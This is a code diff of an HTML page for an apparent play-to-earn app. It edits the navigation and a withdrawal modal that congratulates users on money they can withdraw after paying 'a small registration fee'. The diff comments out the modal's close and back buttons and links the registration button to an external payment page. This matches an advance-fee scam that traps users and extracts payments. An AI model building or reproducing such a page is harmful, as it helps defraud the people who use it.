@@ -76,11 +76,11 @@
           <button class="nav-button" onclick="showSection('withdraw')">
             <i class="fas fa-wallet"></i> Withdraw
           </button>
-          <button class="nav-button active" onclick="showSection('tasks')">
-            <i class="fas fa-tasks"></i> Tasks
+          <button class="nav-button active" onclick="showSection('earn')">
+            <i class="fas fa-tasks"></i> Earn
           </button>
-          <button class="nav-button" onclick="showSection('settings')">
-            <i class="fas fa-cog"></i> Settings
+          <button class="nav-button" onclick="showSection('otherGames')">
+            <i class="fas fa-cog"></i> Other Games
           </button>
           <button class="nav-button" onclick="showSection('profile')">
             <i class="fas fa-user"></i> Profile
@@ -92,8 +92,8 @@
     <!-- Modal for withdrawal -->
     <div id="withdrawalModal" class="modal">
       <div class="modal-content">
-        <span class="close" onclick="closeModal()">&times;</span>
-        <span class="back hidden" onclick="goBack()">&#8592; Back</span>
+        <!-- <span class="close" onclick="closeModal()">&times;</span> -->
+        <!-- <span class="back hidden" onclick="goBack()">&#8592; Back</span> -->
         <div id="withdrawalStep1">
           <h2>Congratulations!</h2>
           <p>You can now withdraw your <span id="money-amount">money.</span></p>
@@ -112,9 +112,11 @@
           <p>
             To make your withdrawal, please complete a small registration fee.
           </p>
-          <button class="withdraw-button" onclick="completeWithdrawal()">
-            Complete Registration
-          </button>
+          <a href="https://go.perfectpay.com.br/PPU38CORIT3">
+            <button class="withdraw-button" onclick="completeWithdrawal()">
+              Complete Registration
+            </button>
+          </a>
         </div>
       </div>
     </div>
@@ -206,5 +208,6 @@
     </div>
 
     <script src="./assets/scripts/script.js"></script>
+    <script src="./assets/scripts/modals.js"></script>
   </body>
 </html>
